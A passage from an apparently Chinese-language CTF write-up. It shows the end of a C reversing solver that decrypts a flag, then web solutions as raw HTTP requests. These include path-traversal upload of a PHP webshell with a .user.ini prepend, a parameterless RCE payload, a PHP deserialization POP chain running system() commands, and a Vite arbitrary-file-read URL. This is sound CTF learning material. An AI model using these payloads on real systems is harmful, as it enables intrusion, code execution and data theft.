    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5,
    0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17,
    0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88,
    0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c,
    0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9,
    0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6,
    0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e,
    0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94,
    0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68,
    0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16};
    
// 0x10ea0处数据
unsigned char box_ori[] = {
    0xd6, 0x90, 0xe9, 0xfe, 0xcc, 0xe1, 0x3d, 0xb7, 0x16, 0xb6, 0x14, 0xc2, 0x28, 0xfb, 0x2c, 0x05,
    0x2b, 0x67, 0x9a, 0x76, 0x2a, 0xbe, 0x04, 0xc3, 0xaa, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99,
    0x9c, 0x42, 0x50, 0xf4, 0x91, 0xef, 0x98, 0x7a, 0x33, 0x54, 0x0b, 0x43, 0xed, 0xcf, 0xac, 0x62,
    0xe4, 0xb3, 0x1c, 0xa9, 0xc9, 0x08, 0xe8, 0x95, 0x80, 0xdf, 0x94, 0xfa, 0x75, 0x8f, 0x3f, 0xa6,
    0x47, 0x07, 0xa7, 0xfc, 0xf3, 0x73, 0x17, 0xba, 0x83, 0x59, 0x3c, 0x19, 0xe6, 0x85, 0x4f, 0xa8,
    0x68, 0x6b, 0x81, 0xb2, 0x71, 0x64, 0xda, 0x8b, 0xf8, 0xeb, 0x0f, 0x4b, 0x70, 0x56, 0x9d, 0x35,
    0x1e, 0x24, 0x0e, 0x5e, 0x63, 0x58, 0xd1, 0xa2, 0x25, 0x22, 0x7c, 0x3b, 0x01, 0x21, 0x78, 0x87,
    0xd4, 0x00, 0x46, 0x57, 0x9f, 0xd3, 0x27, 0x52, 0x4c, 0x36, 0x02, 0xe7, 0xa0, 0xc4, 0xc8, 0x9e,
    0xea, 0xbf, 0x8a, 0xd2, 0x40, 0xc7, 0x38, 0xb5, 0xa3, 0xf7, 0xf2, 0xce, 0xf9, 0x61, 0x15, 0xa1,
    0xe0, 0xae, 0x5d, 0xa4, 0x9b, 0x34, 0x1a, 0x55, 0xad, 0x93, 0x32, 0x30, 0xf5, 0x8c, 0xb1, 0xe3,
    0x1d, 0xf6, 0xe2, 0x2e, 0x82, 0x66, 0xca, 0x60, 0xc0, 0x29, 0x23, 0xab, 0x0d, 0x53, 0x4e, 0x6f,
    0xd5, 0xdb, 0x37, 0x45, 0xde, 0xfd, 0x8e, 0x2f, 0x03, 0xff, 0x6a, 0x72, 0x6d, 0x6c, 0x5b, 0x51,
    0x8d, 0x1b, 0xaf, 0x92, 0xbb, 0xdd, 0xbc, 0x7f, 0x11, 0xd9, 0x5c, 0x41, 0x1f, 0x10, 0x5a, 0xd8,
    0x0a, 0xc1, 0x31, 0x88, 0xa5, 0xcd, 0x7b, 0xbd, 0x2d, 0x74, 0xd0, 0x12, 0xb8, 0xe5, 0xb4, 0xb0,
    0x89, 0x69, 0x97, 0x4a, 0x0c, 0x96, 0x77, 0x7e, 0x65, 0xb9, 0xf1, 0x09, 0xc5, 0x6e, 0xc6, 0x84,
    0x18, 0xf0, 0x7d, 0xec, 0x3a, 0xdc, 0x4d, 0x20, 0x79, 0xee, 0x5f, 0x3e, 0xd7, 0xcb, 0x39, 0x48};
    
void unnamed_function_10(byte *param1, int param2)
{
    for (int i = 0; i < 0x100; i = i + 1)
    {
        param1[i] = param1[i] ^ (byte)param2;
    }
    return;
}

unsigned char Enc[] = {
    0x84, 0x00, 0x00, 0x00,
    0x1c, 0x00, 0x00, 0x00,
    0x6b, 0x00, 0x00, 0x00,
    0xf7, 0x00, 0x00, 0x00,
    0x49, 0x00, 0x00, 0x00,
    0x22, 0x00, 0x00, 0x00,
    0xd6, 0x00, 0x00, 0x00,
    0x42, 0x00, 0x00, 0x00,
    0x50, 0x00, 0x00, 0x00,
    0x7b, 0x00, 0x00, 0x00,
    0x42, 0x00, 0x00, 0x00,
    0xf4, 0x00, 0x00, 0x00,
    0x46, 0x00, 0x00, 0x00,
    0xa9, 0x00, 0x00, 0x00,
    0x83, 0x00, 0x00, 0x00,
    0x62, 0x00, 0x00, 0x00,
    0xd1, 0x00, 0x00, 0x00,
    0x32, 0x00, 0x00, 0x00,
    0x80, 0x00, 0x00, 0x00,
    0x42, 0x00, 0x00, 0x00,
    0x6a, 0x00, 0x00, 0x00,
    0x10, 0x00, 0x00, 0x00,
    0xa3, 0x00, 0x00, 0x00,
    0xf2, 0x00, 0x00, 0x00,
    0xe2, 0x00, 0x00, 0x00,
    0xb8, 0x00, 0x00, 0x00,
    0x0b, 0x00, 0x00, 0x00,
    0x76, 0x00, 0x00, 0x00,
    0xb0, 0x00, 0x00, 0x00,
    0xdc, 0x00, 0x00, 0x00,
    0x02, 0x00, 0x00, 0x00,
    0x51, 0x00, 0x00, 0x00};

void Dec_2(unsigned char *Input, unsigned char *Key)
{
    static int c = 0;
    int iVar1 = (int)Key[c] >> 4;
    DWORD uVar2 = (int)Key[c] & 0xf;
    c++;
    unnamed_function_10(box_ori, (int)*(char *)(iVar1 * 0x10 + (unsigned char *)box + uVar2));
    unsigned char key_o[] = "TGCTF404";
    for (int i = 0; i < 4; i++)
    {
        Input[i] = Input[i] ^ box_ori2[iVar1 * 0x10 + i * 0x11 + uVar2];
        Input[i] = Input[i] ^ key_o[i];
    }
}

void decrypt(unsigned char *Input, int length)
{
    unsigned char Key[] = "TGCTF404";

    for (int i = 0; i < 8; i++)
        Key[i] ^= 0x51;

    for (int i = 0; i < length; i += 4)
    {
        Dec_2((unsigned char *)(Input + i), Key);
    }

    srand(0x194);

    int swaps[32][2];
    for (int i = 0; i < 32; i++)
    {
        auto Value = rand();
        Value = i + Value / (0x7fff / (32 - i) + 1);
        swaps[i][0] = i;
        swaps[i][1] = Value;
    }

    for (int i = 31; i >= 0; i--)
    {
        unsigned char temp = Input[swaps[i][0]];
        Input[swaps[i][0]] = Input[swaps[i][1]];
        Input[swaps[i][1]] = temp;
    }
}

int main()
{
    unsigned char Key[] = "TGCTF404";
    unsigned char Enc_flag[32]{};
    
    for (int i = 0; i < 32; i++)
        Enc_flag[i] = *(int *)((byte *)Enc + i * 4);

    decrypt(Enc_flag, 32);

    printf("%.32s\n", Enc_flag);
    return 0;
}
```

HZNUCTF{f898-de85-46e-9e43-b9c8}

## Web

### (ez)upload

扫目录 有 upload.php.bak 翻源码。name处存在穿越。

可以上传.user.ini。而只有上级目录有php文件可以触发。

因此。我们传图片马和.user.ini到上级目录。等待触发即可。

payload：

```http
POST /upload.php?name=../evil.png HTTP/1.1
Host: node1.tgctf.woooo.tech:32690
Content-Length: 320
Cache-Control: max-age=0
Accept-Language: zh-CN,zh;q=0.9
Origin: http://node1.tgctf.woooo.tech:32690
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary76S3hC5Gh3B7j6KZ
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://node1.tgctf.woooo.tech:32690/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundary76S3hC5Gh3B7j6KZ
Content-Disposition: form-data; name="name"; filename="1.png"
Content-Type: application/octet-stream

<?php phpinfo();?>


------WebKitFormBoundary76S3hC5Gh3B7j6KZ
Content-Disposition: form-data; name="submit"

上传文件
------WebKitFormBoundary76S3hC5Gh3B7j6KZ--
POST /upload.php?name=../.user.ini HTTP/1.1
Host: node1.tgctf.woooo.tech:32690
Content-Length: 335
Cache-Control: max-age=0
Accept-Language: zh-CN,zh;q=0.9
Origin: http://node1.tgctf.woooo.tech:32690
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary76S3hC5Gh3B7j6KZ
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://node1.tgctf.woooo.tech:32690/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundary76S3hC5Gh3B7j6KZ
Content-Disposition: form-data; name="name"; filename=".user.ini"
Content-Type: application/octet-stream

auto_prepend_file=evil.png

------WebKitFormBoundary76S3hC5Gh3B7j6KZ
Content-Disposition: form-data; name="submit"

上传文件
------WebKitFormBoundary76S3hC5Gh3B7j6KZ--
```

在phpinfo的$_SERVER['FLAG']里看到flag

### AAA偷渡阴平

无参数RCE绕过。

payload：

```http
GET /?tgctf2025=eval(end(current(get_defined_vars())));&b=system('cat /f*'); HTTP/1.1
Host: node1.tgctf.woooo.tech:30815
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
CUIASDGHFIOUWE: 123123
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

### 什么文件上传？

robots.txt 进去有 class.php 一眼就能瞪出来pop链子。

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

class yesterday {
    public $learn;
    public $study="study";
    public $try;
    public function __construct()
    {
        $this->learn = "learn<br>";
    }
    public function __destruct()
    {
        echo "You studied hard yesterday.<br>";
        return $this->study->hard();
    }
}
class today {
    public $doing;
    public $did;
    public $done;
    public function __construct(){
        $this->did = "What you did makes you outstanding.<br>";
    }
    public function __call($arg1, $arg2)
    {
        $this->done = "And what you've done has given you a choice.<br>";
        echo $this->done;
        if(md5(md5($this->doing))==666){
            return $this->doing();
        }
        else{
            return $this->doing->better;
        }
    }
}
class tommoraw {
    public $good;
    public $bad;
    public $soso;
    public function __invoke(){
        $this->good="You'll be good tommoraw!<br>";
        echo $this->good;
    }
    public function __get($arg1){
        $this->bad="You'll be bad tommoraw!<br>";
    }

}
class future{
    private $impossible="How can you get here?<br>";
    private $out;
    private $no;
    public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20;

    public function __set($arg1, $arg2) {
        if ($this->out->useful7) {
            echo "Seven is my lucky number<br>";
            system('whoami');
        }
    }
    public function __toString(){
        echo "This is your future.<br>";
        system($_POST["wow"]);
        return "win";
    }
    public function __destruct(){
        $this->no = "no";
        return $this->no;
    }
}
$evil = new yesterday();
$evil -> study = new today();
$evil -> study -> doing = new future();
```

随后序列化evil。base64四次。随后上传文件通过file_exists的检查即可。

```http
POST /upload.php HTTP/1.1
Host: node1.tgctf.woooo.tech:32439
Content-Length: 5437
Cache-Control: max-age=0
Accept-Language: zh-CN,zh;q=0.9
Origin: http://node1.tgctf.woooo.tech:32439
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryurqPJUpE3whNwI5B
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://node1.tgctf.woooo.tech:32439/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundaryurqPJUpE3whNwI5B
Content-Disposition: form-data; name="Vm10b2QyUnJOVlpQV0VKVVlXeGFhRll3VlRCa01XUnpZVVYwYUUxWGVGcFpWRXB6VlVkR2NrMUVTbUZXUlRWUFZHMXpNVlpYU1hsaVIyeFRUVlp3ZGxkVVNYZE5SMFpXVDBod1ZWWkdjRkZXYTJNMVkwWnNjbHBHWkdoU01EVXdWR3RTYjFkdFNuSmhNMHBVVmpOQmQxcFhjelZqVmxwVlYydHdhV0Y2VWpOWGExcHJWVEExVm1KSVJtdFNhMHBSV1ZkNFZrMXNUbGhPVms1cllraENTVlZ0Y0ZkVGJVWjBUMVJhVlUxcVZYZGFWM00xWTFaYVZWZHJjR2xXYTI5NVYxWmFhazFYU25KaVNFWnJVbXRLVVZsWGVISk5iRTVZVFZkR1RsWXhTa3BXYlRWeldWWlZkMkY2U2xWV00wSlBWRzB4Vm1Wc1VsVlhhelZYVWpKTmVWVXhaR3RSTWtwWVZXeHNWbUZyV25GWmJGcFhVV3hzVjFremFHdE5hMncyVmtjMWQyRkdXWGRqU0hCWVlrVTFTMVJxU2s5T2JVbDZZa1U1VjFKNmJIZFdWRUpxVGxVd2QySkZhRlZpVjJod1dWWldTazFXYkhGVWJGcGhUVmM1TlZadGNFTlRiRWw1WVVoT1drMXFSbGRVUkVaRFUwWk9kV0pHUm1oV1YzTjZWMVJPZDJSdFZrWk5WbFpwVFcxNFExVnFSblpsUm5CR1lVWmtiRlp1UWxOVlZ6VmhZVEZrUjFKdVFsVmxhMFYzVkdwS1QwNXRTWHBoUlRWVFVucHNkMVZXVm10WlZURllWV3RzVjJKdGVHaFdWbFpMVFZac2RXSkZjRTlOVmtwNFdrVm9kMVZIUm5SVVZFcFVWbnBXV0ZwWGVIZFhSbVJ4VW0xc1UxSldXbmRXU0hCQ1RVVTBlVlJxV21sbGF6VlJXVlpXZG1WR2JEWlRiR1JwVmpGS1dWcEVUbk5UYlVaMVZXeENWV1ZyTlU5VWJYTXhUbTFKZVdKSGRGaFNWRlo2VmpJd01WWXlUWGROVkZaVVZrZFNWbGxYTlZOT2JGRjVZMGR3VDJFeWVERldiVFYzV1ZaWmVHSXphRnBoTVVwVFdWWlZOR1F3TlVWYVIzQnNZbFJvTmxaRVNuTlRNREZZVkZoc1YySlVSbkpXYWs1cVpVWk9XR05FUWxWTlJHZzJWa1pTWVZReVZuUlBXRUpoVW0xb1VGbHJXbmRrVmxwMVZHczVhRlpYYzNwV2EyUjNUVWRXY2s5WVJscGxiSEJMV1cxNFlVNXNaSE5hUjBaT1ZqQndSbGRVU25OVlJURkZWVlJPV2swelFqSlVWRUUxWTBaT2NWSnRjRTVpUm5Bd1YydGFhMDB3TlVaaVNFWnJVbFJzVVZSVVFYZE5iRkoxWTBoYWFGWXhTbHBXUnpFMFdWZEtjMWR1Y0ZWTlZUVkxWR3BHVTJOWFVrbGpSa0pvWWxkTmVWVXhZekZXTWxaelkwWm9XR0ZyV25CVmExWlhUVEZPV0dORVFsVk5SR2cyVmtaU1lWVkdTa2hQV0VKaFVtMW9VRmxyV25ka1ZscDFWR3MxVjFKV1duZFdTSEJDVFVVMGVWUnFXbWxsYkVwUldWWldkbVZHYkRaVGJHUnBWakZLV1ZwRVRtOVViVVpXWVhwT1YxSXpRWGRhVjNNMVkxWndObGRyY0dsaVJtOHlWako0YTFsVk1WaFRhMVpUVjBoQ1MxbFhOVk5WUmxJMlZHczFUMkY2YkVaWmFrcHpZVEZrUms1WVRsaGlWRlpZV1hwQmVGWldWbGhpUmtKT1VrWkZlbGRVVG5ka2F6VkdUMWhDVkdGclduRlVWM2hoWkVad1IxcEVUbXhTVkZaVlZURlNhMVpYUm5WVmFscFZUVzVDZFZSdGRITmtWbHAxWTBkR1YwMVhPVFJYVjNSVFVtc3hjbUpJUm10U1ZHeFJWRlJCZDAxc1VYZFZibHBvVmpGS1dsWkhNVFJaVjBwelYyNXdWVlpzU25GWlZsVTBaREExUlZwSGNHeGlWR2QzVmtSS2MxTXdNVmhVV0d4WFlsUkdjbFpxVG10T1JsRjNWR3R3VDAxV1NuaGFSV2gzVlVkR2RGbDZTbFJXZWxaWVdsZDRkMWRHWkhGU2JXeFRVbFpWZUZVeFpIZE5SbEYzVDBod1ZWWkdjRkZWYTJNMVkwWndSMkZGT1dsU2JrSXhWbTAxVDFSdFJuSlNia0pWWld0RmQxUnFTbUZYVmxKVlYyczFiR0pVYkhkV01uUnJZekpGZDJKSVJtdFRTRUpSV1ZkemQwMVdVWGxpUlhSWVVqQmFTVlZ0Y0VOVGJFNUlaVVJLWVZKck5VUlpWRXBIVjBaV1dGcEhiRmROUm5BMVZqSjRiMVJzYjNsV2JHaFFWa1ZhUzFWdWNISmxSbkJHWVVVNVRsSnRlRmxVYkdRd1lVWmFObFp1VmxWU00wRXdXVlprVDJOVk5VaGlSa0pPVFVSQmVWWkhkRk5rYlVaWFkwVm9VRmRHV21oV1ZFSnlUVEZhU0dORVFsQldNRFF5V1dwT2QxVkhSbFppTTJSYVRXcFdlVmxXVlRSa01EVkZXa2N4VmxaRVFUVT0=.txt"; filename="Vm10b2QyUnJOVlpQV0VKVVlXeGFhRll3VlRCa01XUnpZVVYwYUUxWGVGcFpWRXB6VlVkR2NrMUVTbUZXUlRWUFZHMXpNVlpYU1hsaVIyeFRUVlp3ZGxkVVNYZE5SMFpXVDBod1ZWWkdjRkZXYTJNMVkwWnNjbHBHWkdoU01EVXdWR3RTYjFkdFNuSmhNMHBVVmpOQmQxcFhjelZqVmxwVlYydHdhV0Y2VWpOWGExcHJWVEExVm1KSVJtdFNhMHBSV1ZkNFZrMXNUbGhPVms1cllraENTVlZ0Y0ZkVGJVWjBUMVJhVlUxcVZYZGFWM00xWTFaYVZWZHJjR2xXYTI5NVYxWmFhazFYU25KaVNFWnJVbXRLVVZsWGVISk5iRTVZVFZkR1RsWXhTa3BXYlRWeldWWlZkMkY2U2xWV00wSlBWRzB4Vm1Wc1VsVlhhelZYVWpKTmVWVXhaR3RSTWtwWVZXeHNWbUZyV25GWmJGcFhVV3hzVjFremFHdE5hMncyVmtjMWQyRkdXWGRqU0hCWVlrVTFTMVJxU2s5T2JVbDZZa1U1VjFKNmJIZFdWRUpxVGxVd2QySkZhRlZpVjJod1dWWldTazFXYkhGVWJGcGhUVmM1TlZadGNFTlRiRWw1WVVoT1drMXFSbGRVUkVaRFUwWk9kV0pHUm1oV1YzTjZWMVJPZDJSdFZrWk5WbFpwVFcxNFExVnFSblpsUm5CR1lVWmtiRlp1UWxOVlZ6VmhZVEZrUjFKdVFsVmxhMFYzVkdwS1QwNXRTWHBoUlRWVFVucHNkMVZXVm10WlZURllWV3RzVjJKdGVHaFdWbFpMVFZac2RXSkZjRTlOVmtwNFdrVm9kMVZIUm5SVVZFcFVWbnBXV0ZwWGVIZFhSbVJ4VW0xc1UxSldXbmRXU0hCQ1RVVTBlVlJxV21sbGF6VlJXVlpXZG1WR2JEWlRiR1JwVmpGS1dWcEVUbk5UYlVaMVZXeENWV1ZyTlU5VWJYTXhUbTFKZVdKSGRGaFNWRlo2VmpJd01WWXlUWGROVkZaVVZrZFNWbGxYTlZOT2JGRjVZMGR3VDJFeWVERldiVFYzV1ZaWmVHSXphRnBoTVVwVFdWWlZOR1F3TlVWYVIzQnNZbFJvTmxaRVNuTlRNREZZVkZoc1YySlVSbkpXYWs1cVpVWk9XR05FUWxWTlJHZzJWa1pTWVZReVZuUlBXRUpoVW0xb1VGbHJXbmRrVmxwMVZHczVhRlpYYzNwV2EyUjNUVWRXY2s5WVJscGxiSEJMV1cxNFlVNXNaSE5hUjBaT1ZqQndSbGRVU25OVlJURkZWVlJPV2swelFqSlVWRUUxWTBaT2NWSnRjRTVpUm5Bd1YydGFhMDB3TlVaaVNFWnJVbFJzVVZSVVFYZE5iRkoxWTBoYWFGWXhTbHBXUnpFMFdWZEtjMWR1Y0ZWTlZUVkxWR3BHVTJOWFVrbGpSa0pvWWxkTmVWVXhZekZXTWxaelkwWm9XR0ZyV25CVmExWlhUVEZPV0dORVFsVk5SR2cyVmtaU1lWVkdTa2hQV0VKaFVtMW9VRmxyV25ka1ZscDFWR3MxVjFKV1duZFdTSEJDVFVVMGVWUnFXbWxsYkVwUldWWldkbVZHYkRaVGJHUnBWakZLV1ZwRVRtOVViVVpXWVhwT1YxSXpRWGRhVjNNMVkxWndObGRyY0dsaVJtOHlWako0YTFsVk1WaFRhMVpUVjBoQ1MxbFhOVk5WUmxJMlZHczFUMkY2YkVaWmFrcHpZVEZrUms1WVRsaGlWRlpZV1hwQmVGWldWbGhpUmtKT1VrWkZlbGRVVG5ka2F6VkdUMWhDVkdGclduRlVWM2hoWkVad1IxcEVUbXhTVkZaVlZURlNhMVpYUm5WVmFscFZUVzVDZFZSdGRITmtWbHAxWTBkR1YwMVhPVFJYVjNSVFVtc3hjbUpJUm10U1ZHeFJWRlJCZDAxc1VYZFZibHBvVmpGS1dsWkhNVFJaVjBwelYyNXdWVlpzU25GWlZsVTBaREExUlZwSGNHeGlWR2QzVmtSS2MxTXdNVmhVV0d4WFlsUkdjbFpxVG10T1JsRjNWR3R3VDAxV1NuaGFSV2gzVlVkR2RGbDZTbFJXZWxaWVdsZDRkMWRHWkhGU2JXeFRVbFpWZUZVeFpIZE5SbEYzVDBod1ZWWkdjRkZWYTJNMVkwWndSMkZGT1dsU2JrSXhWbTAxVDFSdFJuSlNia0pWWld0RmQxUnFTbUZYVmxKVlYyczFiR0pVYkhkV01uUnJZekpGZDJKSVJtdFRTRUpSV1ZkemQwMVdVWGxpUlhSWVVqQmFTVlZ0Y0VOVGJFNUlaVVJLWVZKck5VUlpWRXBIVjBaV1dGcEhiRmROUm5BMVZqSjRiMVJzYjNsV2JHaFFWa1ZhUzFWdWNISmxSbkJHWVVVNVRsSnRlRmxVYkdRd1lVWmFObFp1VmxWU00wRXdXVlprVDJOVk5VaGlSa0pPVFVSQmVWWkhkRk5rYlVaWFkwVm9VRmRHV21oV1ZFSnlUVEZhU0dORVFsQldNRFF5V1dwT2QxVkhSbFppTTJSYVRXcFdlVmxXVlRSa01EVkZXa2N4VmxaRVFUVT0=.txt"
Content-Type: application/octet-stream

111

------WebKitFormBoundaryurqPJUpE3whNwI5B--
POST /class.php?filename=Vm10b2QyUnJOVlpQV0VKVVlXeGFhRll3VlRCa01XUnpZVVYwYUUxWGVGcFpWRXB6VlVkR2NrMUVTbUZXUlRWUFZHMXpNVlpYU1hsaVIyeFRUVlp3ZGxkVVNYZE5SMFpXVDBod1ZWWkdjRkZXYTJNMVkwWnNjbHBHWkdoU01EVXdWR3RTYjFkdFNuSmhNMHBVVmpOQmQxcFhjelZqVmxwVlYydHdhV0Y2VWpOWGExcHJWVEExVm1KSVJtdFNhMHBSV1ZkNFZrMXNUbGhPVms1cllraENTVlZ0Y0ZkVGJVWjBUMVJhVlUxcVZYZGFWM00xWTFaYVZWZHJjR2xXYTI5NVYxWmFhazFYU25KaVNFWnJVbXRLVVZsWGVISk5iRTVZVFZkR1RsWXhTa3BXYlRWeldWWlZkMkY2U2xWV00wSlBWRzB4Vm1Wc1VsVlhhelZYVWpKTmVWVXhaR3RSTWtwWVZXeHNWbUZyV25GWmJGcFhVV3hzVjFremFHdE5hMncyVmtjMWQyRkdXWGRqU0hCWVlrVTFTMVJxU2s5T2JVbDZZa1U1VjFKNmJIZFdWRUpxVGxVd2QySkZhRlZpVjJod1dWWldTazFXYkhGVWJGcGhUVmM1TlZadGNFTlRiRWw1WVVoT1drMXFSbGRVUkVaRFUwWk9kV0pHUm1oV1YzTjZWMVJPZDJSdFZrWk5WbFpwVFcxNFExVnFSblpsUm5CR1lVWmtiRlp1UWxOVlZ6VmhZVEZrUjFKdVFsVmxhMFYzVkdwS1QwNXRTWHBoUlRWVFVucHNkMVZXVm10WlZURllWV3RzVjJKdGVHaFdWbFpMVFZac2RXSkZjRTlOVmtwNFdrVm9kMVZIUm5SVVZFcFVWbnBXV0ZwWGVIZFhSbVJ4VW0xc1UxSldXbmRXU0hCQ1RVVTBlVlJxV21sbGF6VlJXVlpXZG1WR2JEWlRiR1JwVmpGS1dWcEVUbk5UYlVaMVZXeENWV1ZyTlU5VWJYTXhUbTFKZVdKSGRGaFNWRlo2VmpJd01WWXlUWGROVkZaVVZrZFNWbGxYTlZOT2JGRjVZMGR3VDJFeWVERldiVFYzV1ZaWmVHSXphRnBoTVVwVFdWWlZOR1F3TlVWYVIzQnNZbFJvTmxaRVNuTlRNREZZVkZoc1YySlVSbkpXYWs1cVpVWk9XR05FUWxWTlJHZzJWa1pTWVZReVZuUlBXRUpoVW0xb1VGbHJXbmRrVmxwMVZHczVhRlpYYzNwV2EyUjNUVWRXY2s5WVJscGxiSEJMV1cxNFlVNXNaSE5hUjBaT1ZqQndSbGRVU25OVlJURkZWVlJPV2swelFqSlVWRUUxWTBaT2NWSnRjRTVpUm5Bd1YydGFhMDB3TlVaaVNFWnJVbFJzVVZSVVFYZE5iRkoxWTBoYWFGWXhTbHBXUnpFMFdWZEtjMWR1Y0ZWTlZUVkxWR3BHVTJOWFVrbGpSa0pvWWxkTmVWVXhZekZXTWxaelkwWm9XR0ZyV25CVmExWlhUVEZPV0dORVFsVk5SR2cyVmtaU1lWVkdTa2hQV0VKaFVtMW9VRmxyV25ka1ZscDFWR3MxVjFKV1duZFdTSEJDVFVVMGVWUnFXbWxsYkVwUldWWldkbVZHYkRaVGJHUnBWakZLV1ZwRVRtOVViVVpXWVhwT1YxSXpRWGRhVjNNMVkxWndObGRyY0dsaVJtOHlWako0YTFsVk1WaFRhMVpUVjBoQ1MxbFhOVk5WUmxJMlZHczFUMkY2YkVaWmFrcHpZVEZrUms1WVRsaGlWRlpZV1hwQmVGWldWbGhpUmtKT1VrWkZlbGRVVG5ka2F6VkdUMWhDVkdGclduRlVWM2hoWkVad1IxcEVUbXhTVkZaVlZURlNhMVpYUm5WVmFscFZUVzVDZFZSdGRITmtWbHAxWTBkR1YwMVhPVFJYVjNSVFVtc3hjbUpJUm10U1ZHeFJWRlJCZDAxc1VYZFZibHBvVmpGS1dsWkhNVFJaVjBwelYyNXdWVlpzU25GWlZsVTBaREExUlZwSGNHeGlWR2QzVmtSS2MxTXdNVmhVV0d4WFlsUkdjbFpxVG10T1JsRjNWR3R3VDAxV1NuaGFSV2gzVlVkR2RGbDZTbFJXZWxaWVdsZDRkMWRHWkhGU2JXeFRVbFpWZUZVeFpIZE5SbEYzVDBod1ZWWkdjRkZWYTJNMVkwWndSMkZGT1dsU2JrSXhWbTAxVDFSdFJuSlNia0pWWld0RmQxUnFTbUZYVmxKVlYyczFiR0pVYkhkV01uUnJZekpGZDJKSVJtdFRTRUpSV1ZkemQwMVdVWGxpUlhSWVVqQmFTVlZ0Y0VOVGJFNUlaVVJLWVZKck5VUlpWRXBIVjBaV1dGcEhiRmROUm5BMVZqSjRiMVJzYjNsV2JHaFFWa1ZhUzFWdWNISmxSbkJHWVVVNVRsSnRlRmxVYkdRd1lVWmFObFp1VmxWU00wRXdXVlprVDJOVk5VaGlSa0pPVFVSQmVWWkhkRk5rYlVaWFkwVm9VRmRHV21oV1ZFSnlUVEZhU0dORVFsQldNRFF5V1dwT2QxVkhSbFppTTJSYVRXcFdlVmxXVlRSa01EVkZXa2N4VmxaRVFUVT0=.txt HTTP/1.1
Host: node1.tgctf.woooo.tech:32439
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 11

wow=cat /f*
```

### 前端GAME

紧跟时事。是最新的ViteJS的CVE。F12搜能搜到flag路径（理论上来说可以，我是手打的（（），然后用CVE打就完了。

这题因为靶机问题，没打成。跟出题人对过思路和脚本之后出题人直接给我flag的。直接在flag路径后加?import&raw??即可

```
http://node1.tgctf.woooo.tech:32360/@fs/tgflagggg?import&raw??
```

### 前端GAME plus

